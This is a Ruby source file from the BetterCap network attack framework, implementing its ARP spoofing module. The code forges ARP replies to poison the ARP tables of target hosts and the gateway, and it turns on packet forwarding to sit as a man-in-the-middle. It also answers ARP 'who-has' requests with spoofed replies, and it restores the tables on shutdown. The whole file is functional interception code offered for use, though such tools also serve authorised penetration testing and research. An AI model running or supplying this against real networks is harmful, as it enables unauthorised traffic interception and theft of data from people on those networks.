=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
require 'bettercap/spoofers/base'
require 'bettercap/error'
require 'bettercap/context'
require 'bettercap/network'
require 'bettercap/logger'
require 'colorize'

module BetterCap
module Spoofers
# This class is responsible of performing ARP spoofing on the network.
class Arp < Base
  # Initialize the BetterCap::Spoofers::Arp object.
  def initialize
    @ctx          = Context.get
    @gateway      = nil
    @forwarding   = @ctx.firewall.forwarding_enabled?
    @spoof_thread = nil
    @sniff_thread = nil
    @capture      = nil
    @running      = false

    update_gateway!
  end

  # Send a spoofed ARP reply to the target identified by the +daddr+ IP address
  # and +dmac+ MAC address, spoofing the +saddr+ IP address and +smac+ MAC
  # address as the source device.
  def send_spoofed_packet( saddr, smac, daddr, dmac )
    pkt = PacketFu::ARPPacket.new
    pkt.eth_saddr = smac
    pkt.eth_daddr = dmac
    pkt.arp_saddr_mac = smac
    pkt.arp_daddr_mac = dmac
    pkt.arp_saddr_ip = saddr
    pkt.arp_daddr_ip = daddr
    pkt.arp_opcode = 2

    @ctx.packets.push(pkt)
  end

  # Start the ARP spoofing.
  def start
    Logger.info "Starting ARP spoofer ( #{@ctx.options.half_duplex ? 'Half' : 'Full'} Duplex ) ..."

    stop() if @running
    @running = true

    @ctx.firewall.enable_forwarding(true) unless @forwarding

    @sniff_thread = Thread.new { arp_watcher }
    @spoof_thread = Thread.new { arp_spoofer }
  end

  # Stop the ARP spoofing, reset firewall state and restore targets ARP table.
  def stop
    raise 'ARP spoofer is not running' unless @running

    Logger.info 'Stopping ARP spoofer ...'

    Logger.debug "Resetting packet forwarding to #{@forwarding} ..."
    @ctx.firewall.enable_forwarding( @forwarding )

    @running = false
    begin
      @spoof_thread.exit
    rescue
    end

    Logger.info "Restoring ARP table of #{@ctx.targets.size} targets ..."

    @ctx.targets.each do |target|
      unless target.ip.nil? or target.mac.nil?
        begin
          send_spoofed_packet( @gateway.ip, @gateway.mac, target.ip, target.mac )
          send_spoofed_packet( target.ip, target.mac, @gateway.ip, @gateway.mac ) unless @ctx.options.half_duplex
        rescue; end
      end
    end
  end

  private

  def update_targets!
    @ctx.targets.each do |target|
      # targets could change, update mac addresses if needed
      if target.mac.nil?
        hw = Network.get_hw_address( @ctx.ifconfig, target.ip )
        if hw.nil?
          Logger.warn "Couldn't determine target #{ip} MAC!"
          next
        else
          Logger.info "  Target MAC    : #{hw}"
          target.mac = hw
        end
      # target was specified by MAC address
      elsif target.ip_refresh
        ip = Network.get_ip_address( @ctx, target.mac )
        if ip.nil?
          Logger.warn "Couldn't determine target #{target.mac} IP!"
          next
        else
          Logger.info "Target #{target.mac} IP : #{ip}" if target.ip.nil? or target.ip != ip
          target.ip = ip
        end
      end
    end
  end

  def arp_spoofer
    spoof_loop(1) { |target|
      unless target.ip.nil? or target.mac.nil?
        send_spoofed_packet( @gateway.ip, @ctx.ifconfig[:eth_saddr], target.ip, target.mac )
        send_spoofed_packet( target.ip, @ctx.ifconfig[:eth_saddr], @gateway.ip, @gateway.mac ) unless @ctx.options.half_duplex
      end
    }
  end

  def arp_watcher
    Logger.info 'ARP watcher started ...'

    sniff_packets('arp') { |pkt|
      # we're only interested in 'who-has' packets
      if pkt.arp_opcode == 1 and pkt.arp_dst_mac.to_s == '00:00:00:00:00:00'
        is_from_us = ( pkt.arp_src_ip.to_s == @ctx.ifconfig[:ip_saddr] )
        unless is_from_us
          Logger.info "[ARP] #{pkt.arp_src_ip.to_s} is asking who #{pkt.arp_dst_ip.to_s} is."

          send_spoofed_packet pkt.arp_dst_ip.to_s, @ctx.ifconfig[:eth_saddr], pkt.arp_src_ip.to_s, pkt.arp_src_mac.to_s
        end
      end
    }
  end
end
end
end
